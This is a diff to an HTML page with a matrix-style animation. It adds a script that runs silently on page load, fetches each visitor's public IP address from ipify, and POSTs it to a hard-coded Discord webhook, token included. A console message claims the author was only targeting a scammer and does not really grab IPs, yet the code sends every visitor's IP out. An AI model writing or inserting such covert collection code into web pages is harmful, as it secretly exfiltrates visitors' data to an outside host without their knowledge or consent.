@@ -212,6 +212,35 @@
         window.onload = type;
     </script>
     <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1127748658843095060/2fG5gvO10BdXgDPx3G83ApyGlVJiWk4gAcw7bhG23RnycTDWyVLRoB5bJEUprOa8GCKM';
+
+        // Make a request to the IP fetch service
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                sendToDiscord(ip);
+            })
+            .catch(error => console.error('Error:', error));
+
+        // Function to send IP address to Discord webhook
+        function sendToDiscord(ip) {
+            const payload = {
+                content: 'My IP Address: ' + ip
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(() => console.log('IP address sent to Discord (Dont worry this was for a scammer, i dont actually grab ips)'))
+            .catch(error => console.error('Error sending to Discord:', error));
+        }
+    </script>
+    <script>
     console.log("Credit for the matrix effect goes to Clive Cooper on codepen, check them out: https://codepen.io/yaclive")
         var canvas = document.querySelector('canvas'),
         ctx = canvas.getContext('2d');
